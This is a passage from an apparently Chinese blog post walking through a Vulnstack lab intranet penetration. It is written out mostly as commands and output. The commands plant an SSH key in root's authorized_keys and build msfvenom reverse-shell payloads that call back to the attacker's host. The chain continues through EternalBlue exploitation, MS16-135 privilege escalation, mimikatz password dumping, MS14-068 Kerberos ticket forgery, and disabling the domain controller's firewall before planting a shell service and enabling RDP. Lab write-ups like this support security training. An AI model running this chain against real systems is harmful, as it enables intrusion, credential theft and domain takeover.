class=\"hljs-regexp\">/var/</span>log/cron.log）<br><br><span class=\"hljs-number\">2</span>. unix<br>在 <span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/cron/</span>tmp文件中，有croutXXX001864的tmp文件，tail 这些文件就可以看到正在执行的任务了。<br><br><span class=\"hljs-number\">3</span>. mail任务<br>在 <span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/mail/</span>root 文件中，有crontab执行日志的记录，用tail -f <span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/mail/</span>root 即可查看最近的crontab执行情况<br></code></pre></td></tr></table></figure>\n</li>\n</ol>\n<h4 id=\"尝试写ssh公钥来连接\"><a class=\"markdownIt-Anchor\" href=\"#尝试写ssh公钥来连接\">#</a> 尝试写.ssh 公钥来连接</h4>\n<ol>\n<li>\n<p>本地生成公私钥</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">ssh</span>-keygen -f m<span class=\"hljs-number\">1</span>n<br><span class=\"hljs-attribute\">chmod</span> <span class=\"hljs-number\">600</span> m<span class=\"hljs-number\">1</span>n<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>把 m1n.pub 文件上传到服务器的 <code>/root/.ssh/</code>  目录下（注意，是 /m1n 下的 /root/.ssh），没有这个目录就创建这个目录</p>\n</li>\n<li>\n<p>把 m1n.pub 的文件内容写到 authorized_keys 文件中 <code>cat m1n.pub &gt; authorized_keys</code></p>\n</li>\n<li>\n<p>然后 <code>ssh -i m1n root@ip</code>  连接，即可</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>踩坑笔记：不要写公钥到 <code>/home/ubuntu/.ssh/</code>  目录下，连不上。</p>\n</li>\n</ol>\n<h2 id=\"内网渗透\"><a class=\"markdownIt-Anchor\" href=\"#内网渗透\">#</a> 内网渗透</h2>\n<h3 id=\"传\"><a class=\"markdownIt-Anchor\" href=\"#传\">#</a> 传🐎</h3>\n<h4 id=\"msf\"><a class=\"markdownIt-Anchor\" href=\"#msf\">#</a> MSF🐎</h4>\n<ol>\n<li>\n<p>生成 msf🐎</p>\n<p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.192.168.145 LPORT=4444 -f elf &gt; mshell.elf</code></p>\n</li>\n<li>\n<p>把🐎儿传到目标机子上面</p>\n</li>\n<li>\n<p>攻击机执行以下</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\">use exploit/multi/handler<br><span class=\"hljs-builtin-name\">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class=\"hljs-builtin-name\">set</span> lhost 10.192.168.145<br><span class=\"hljs-builtin-name\">set</span> lport 4444<br>run<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>目标机器添加权限后执行 mshell.elf</p>\n</li>\n<li>\n<p>kali 接收到 shell</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>msf 拿到 shell 后，需要导入路由，使用 msf6 的自动路由导入</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stata\">background<br><br><span class=\"hljs-keyword\">use</span> <span class=\"hljs-keyword\">post</span>/multi/manage/autoroute<br><br><span class=\"hljs-keyword\">set</span> session x<br><br><span class=\"hljs-keyword\">run</span><br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n</ol>\n<h3 id=\"代理转发\"><a class=\"markdownIt-Anchor\" href=\"#代理转发\">#</a> 代理转发</h3>\n<h4 id=\"使用ew代理转发\"><a class=\"markdownIt-Anchor\" href=\"#使用ew代理转发\">#</a> 使用 ew 代理转发</h4>\n<ol>\n<li>上传 ew_for_linux64</li>\n<li>执行 <code>./ew -s ssocksd -l 8888</code></li>\n<li>更改 kali 的 /etc/proxychains4.conf 文件，添加 socks5 ip prot</li>\n<li>在需要代理时，执行命令如 <code>proxychains4 curl http://127.0.0.1:2003/</code>  即可</li>\n</ol>\n<h3 id=\"ubuntu信息收集\"><a class=\"markdownIt-Anchor\" href=\"#ubuntu信息收集\">#</a> Ubuntu 信息收集</h3>\n<ol>\n<li>\n<p>从路由表可以看到有几个网段，有个 183 网段应该就是内网网段了</p>\n</li>\n<li>\n<p>msf 进行一波存活扫描</p>\n<figure class=\"highlight gams\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gams\">use auxiliary/scanner/discovery/udp_probe<br><span class=\"hljs-keyword\">set</span> rhosts <span class=\"hljs-comment\">192.168.183.0-255</span><br><span class=\"hljs-keyword\">set</span> <span class=\"hljs-comment\">threads 5</span><br>run<br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271043598.png\" alt=\"\" class=\"lazyload\"></p>\n<p>可以看到有 128、130 两台机子。</p>\n</li>\n<li>\n<p>扫一下 ms17-010</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">use</span> auxiliary/scanner/smb/smb_ms<span class=\"hljs-number\">17</span>_<span class=\"hljs-number\">010</span><br><span class=\"hljs-attribute\">set</span> rhosts <span class=\"hljs-number\">192.168.183.128</span>-<span class=\"hljs-number\">130</span><br><span class=\"hljs-attribute\">run</span><br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271046846.png\" alt=\"\" class=\"lazyload\"></p>\n<p>可以看到 128 的 win7 和 130 的 winserver2008 都可能存在永恒之蓝。</p>\n</li>\n<li>\n<p>尝试打永恒之蓝，测试发现 128 的 win7 能打通，130 的 winserver2008 打不通。</p>\n<figure class=\"highlight gams\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gams\">setg Proxies socks5:<span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.5</span><span class=\"hljs-number\">.100</span>:<span class=\"hljs-number\">8888</span>\t\t\t\t\t<span class=\"hljs-comment\">//MSF走ew的代理</span><br><span class=\"hljs-keyword\">set</span> ReverseAllowProxy <span class=\"hljs-comment\">true</span>\t\t\t\t\t\t\t//开启反向代理<br>use <span class=\"hljs-comment\">exploit</span>/windows/<span class=\"hljs-comment\">smb</span>/ms17_010_eternalblue<br>set payload windows/<span class=\"hljs-comment\">x64</span>/meterpreter/<span class=\"hljs-comment\">bind_tcp</span><br><span class=\"hljs-keyword\">set</span> <span class=\"hljs-comment\">rhost 192.168.183.128</span><br><span class=\"hljs-keyword\">set</span> <span class=\"hljs-comment\">lport 4444</span><br><span class=\"hljs-keyword\">set</span> <span class=\"hljs-comment\">AutoRunScript post</span>/windows/<span class=\"hljs-comment\">manage</span>/migrate       <span class=\"hljs-comment\">//自动迁移进程</span><br>run<br></code></pre></td></tr></table></figure>\n<p>成功拿下 shell</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271535393.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n</ol>\n<h3 id=\"win7权限维持\"><a class=\"markdownIt-Anchor\" href=\"#win7权限维持\">#</a> Win7 权限维持</h3>\n<ol>\n<li>\n<p>虽然拿到了 shell，但是在使用过程中发现这个 shell 经常掉线，只能想办法弄个稳定点的 shell</p>\n</li>\n<li>\n<p>拿 ubuntu 当作跳板机，把 frps 传到 ubuntu 上，不修改配置，直接执行 <code>./frps -c ./frps.ini</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549039.png\" alt=\"image-20211112170138230\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>把 frpc 上传到自己的 CS 服务器，修改 frpc.ini 后启动 frpc： <code>./frpc -c ./frpc.ini</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549704.png\" alt=\"image-20211112170249583\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>CS 创建一个 ip 为 ubuntu 的监听器</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549079.png\" alt=\"image-20211112170412976\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>生成马传到 win7 上执行即可上线</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549213.png\" alt=\"image-20211112170455408\" class=\"lazyload\"></p>\n<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.128 LPORT=4455 -f exe -o mshell.exe</code></p>\n<p>use exploit/multi/handler</p>\n<p>set payload windows/meterpreter/reverse_tcp</p>\n</li>\n</ol>\n<h3 id=\"win7信息收集\"><a class=\"markdownIt-Anchor\" href=\"#win7信息收集\">#</a> Win7 信息收集</h3>\n<ol>\n<li>\n<p><code>route print</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549823.png\" alt=\"image-20211112171015589\" class=\"lazyload\"></p>\n</li>\n<li>\n<p><code>net user /domain</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737928.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n<li>\n<p><code>net user</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071745632.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n<li>\n<p><code>net view</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071742103.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n<li>\n<p><code>nslookup WIN-ENS2VR5TR3N</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550718.png\" alt=\"image-20211112171507481\" class=\"lazyload\"></p>\n</li>\n</ol>\n<h3 id=\"win7提权\"><a class=\"markdownIt-Anchor\" href=\"#win7提权\">#</a> Win7 提权</h3>\n<p>先 systeminfo 拿到补丁列表，使用 http://bugs.hacking8.com/tiquan/ 直接查询可用 exp，发现 MS16-135 可用，直接梼杌 MS16-135 提权一把梭</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550478.png\" alt=\"image-20211114004439133\" class=\"lazyload\"></p>\n<p>拿到新 shell，尝试用猕猴桃拿密码</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550982.png\" alt=\"image-20211114004938173\" class=\"lazyload\"></p>\n<p><code>mimikatz sekurlsa::logonpasswords</code>  拿到明文密码</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550669.png\" alt=\"image-20211114005145157\" class=\"lazyload\"></p>\n<h3 id=\"win7打域控\"><a class=\"markdownIt-Anchor\" href=\"#win7打域控\">#</a> Win7 打域控</h3>\n<p>同样的，使用 http://bugs.hacking8.com/tiquan/ 发现可以用 MS14-068，工具：<a href=\"https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068\">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>\n<p>用收集到的 sid、成员名、密码伪造票据</p>\n<figure class=\"highlight subunit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs subunit\">//ms14<span class=\"hljs-string\">-068</span>.exe -u 域成员名@域名.com -s 域成员sid -d 域控制器ip地址 -p 域成员密码<br><br>ms14<span class=\"hljs-string\">-068</span>.exe -u douser@DEMO.com -s S<span class=\"hljs-string\">-1</span><span class=\"hljs-string\">-5</span><span class=\"hljs-string\">-21</span><span class=\"hljs-string\">-979886063</span><span class=\"hljs-string\">-1111900045</span><span class=\"hljs-string\">-1414766810</span><span class=\"hljs-string\">-1107</span> -d 192.168.183.130 -p Dotest123<br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550909.png\" alt=\"image-20211114010319666\" class=\"lazyload\"></p>\n<p>用猕猴桃注入票据</p>\n<figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs dts\">mimikatz kerberos::purge         <span class=\"hljs-comment\">//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br>mimikatz kerberos::list          <span class=\"hljs-comment\">//查看当前机器凭证</span><br>mimikatz kerberos::ptc <span class=\"hljs-params\">&lt;生成的票据文件&gt;</span>   <span class=\"hljs-comment\">//将票据注入到内存中</span><br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550025.png\" alt=\"image-20211114010623765\" class=\"lazyload\"></p>\n<p>尝试查看域控的 C 盘</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">net</span> use \\\\WIN-ENS<span class=\"hljs-number\">2</span>VR<span class=\"hljs-number\">5</span>TR<span class=\"hljs-number\">3</span>N<br><span class=\"hljs-attribute\">dir</span> \\\\WIN-ENS<span class=\"hljs-number\">2</span>VR<span class=\"hljs-number\">5</span>TR<span class=\"hljs-number\">3</span>N\\c$<br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550134.png\" alt=\"image-20211114010832260\" class=\"lazyload\"></p>\n<h3 id=\"域控维权\"><a class=\"markdownIt-Anchor\" href=\"#域控维权\">#</a> 域控维权</h3>\n<p>再生成一个 CS 马，通过 win7 传到 DC 上</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550189.png\" alt=\"image-20211114011638641\" class=\"lazyload\"></p>\n<p>关掉 DC 的防火墙</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">sc</span> \\\\WIN-ENS<span class=\"hljs-number\">2</span>VR<span class=\"hljs-number\">5</span>TR<span class=\"hljs-number\">3</span>N create unablefirewall binpath= <span class=\"hljs-string\">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><br><span class=\"hljs-attribute\">sc</span> \\\\WIN-ENS<span class=\"hljs-number\">2</span>VR<span class=\"hljs-number\">5</span>TR<span class=\"hljs-number\">3</span>N start unablefirewall<br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550638.png\" alt=\"image-20211114011840038\" class=\"lazyload\"></p>\n<p>执行 shell</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">sc</span> \\\\WIN-ENS<span class=\"hljs-number\">2</span>VR<span class=\"hljs-number\">5</span>TR<span class=\"hljs-number\">3</span>N create bindshell binpath= <span class=\"hljs-string\">&quot;c:\\cshell2.exe&quot;</span><br><span class=\"hljs-attribute\">sc</span> \\\\WIN-ENS<span class=\"hljs-number\">2</span>VR<span class=\"hljs-number\">5</span>TR<span class=\"hljs-number\">3</span>N start bindshell<br></code></pre></td></tr></table></figure>\n<p>拿到 130 的新 shell</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550887.png\" alt=\"image-20211114012104545\" class=\"lazyload\"></p>\n<p>猕猴桃拿密码</p>\n<figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs arduino\">mimikatz privilege::debug<br>mimikatz sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550717.png\" alt=\"image-20211114012906263\" class=\"lazyload\"></p>\n<p>拿到明文密码</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550550.png\" alt=\"image-20211114013013491\" class=\"lazyload\"></p>\n<p>开启 3389</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal<span class=\"hljs-string\">&quot; &quot;</span>Server <span class=\"hljs-regexp\">/v fDenyTSConnections /</span>t REG_DWORD <span class=\"hljs-regexp\">/d 0 /</span>f<br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550855.png\" alt=\"image-20211114013625435\" class=\"lazyload\"></p>\n<p>用 kali 的 RDP 工具，走之前的 ew 代理连接</p>\n<p><code>proxychains4 rdesktop 192.168.183.130</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041551462.png\" alt=\"image-20211114014338299\" class=\"lazyload\"></p>\n<p>或者免去以上步骤，直接 CS 的 VNC</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041551829.png\" alt=\"image-20211114013338451\" class=\"lazyload\"></p>\n<h2 id=\"reference\"><a class=\"markdownIt-Anchor\" href=\"#reference\">#</a> Reference</h2>\n<p><a href=\"http://vulnstack.qiyuanxuetang.net/vuln/detail/6/\">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/271892.html\">https://www.freebuf.com/articles/web/271892.html</a></p>\n<p><a href=\"https://www.dazhuanlan.com/oliiiflorrr/topics/1144804\">https://www.dazhuanlan.com/oliiiflorrr/topics/1144804</a></p>\n<p><a href=\"https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/\">https://m3lon.github.io/2019/03/18 / 解决 ubuntu-crontab 反弹 shell 失败的问题 /</a></p>\n<p><a href=\"https://www.cnblogs.com/zhangshengxiang/p/11842326.html\">https://www.cnblogs.com/zhangshengxiang/p/11842326.html</a></p>\n<p><a href=\"http://www.hackdig.com/09/hack-492089.htm\">http://www.hackdig.com/09/hack-492089.htm</a></p>\n<p><a href=\"https://blog.csdn.net/zy15667076526/article/details/116059592\">https://blog.csdn.net/zy15667076526/article/details/116059592</a></p>\n",
            "tags": []
        }
    ]
}